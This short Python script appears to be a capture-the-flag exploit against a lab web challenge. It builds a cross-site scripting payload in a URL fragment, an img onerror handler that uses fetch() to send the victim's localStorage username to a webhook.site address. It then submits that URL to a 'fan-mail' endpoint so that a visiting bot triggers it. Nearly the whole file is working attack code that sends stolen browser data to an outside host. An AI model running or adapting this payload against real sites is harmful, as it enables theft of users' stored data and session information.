import sys, json, requests, urllib3, urllib.parse, time
sys.stdout.reconfigure(encoding="utf-8", errors="replace")
urllib3.disable_warnings()
UUID = "3a136222-2f46-4372-9236-90095ca2eb4d"
SITE = "http://xebec.cylabacademy.net:41075/"
js = "fetch('https://webhook.site/%s/?f='+encodeURIComponent(localStorage.username))" % UUID
params = {"src": "invalid", "onerror": js}
frag = urllib.parse.urlencode(params)
target = "http://localhost:4000/drawing/1#" + frag
print("URL cible:", target[:200], "...")
print("longueur:", len(target))
try:
    r = requests.post(SITE.rstrip("/") + "/fan-mail", json={"url": target}, timeout=30)
    print("fan-mail ->", r.status_code, r.text[:200])
except Exception as e:
    print("ERR", type(e).__name__, e)
